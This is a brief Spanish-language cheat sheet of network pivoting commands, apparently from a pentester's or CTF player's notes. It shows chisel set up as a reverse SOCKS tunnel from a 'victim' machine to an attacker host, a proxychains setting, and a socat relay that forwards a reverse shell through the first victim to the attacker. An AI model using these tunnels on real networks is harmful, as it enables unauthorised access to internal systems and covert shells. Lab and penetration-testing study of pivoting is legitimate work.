# Comandos interesantes de PICOTING



## CHISEL
cliente , en la maquina victima 1
<pre>
./chisel client 192.168.168.224:1234 R:socks
</pre>

Servidor en maquina atacante. 
<pre>
./chisel server --reverse -p 1234
</pre>

Como se va por socks hay que habilitar socks5 en /etc/proxychains.conf
<pre>
socks5  127.0.0.1 1080
</pre>


## SOCAT
Si lanzamos una reverse shell de la maquina 2 a la maquina 1 podemos redirigir con sockat el trafico de la maquina 1 a la atacante
<pre>
socat TCP-LISTEN:4646,fork TCP:192.168.168.224:4646
</pre>
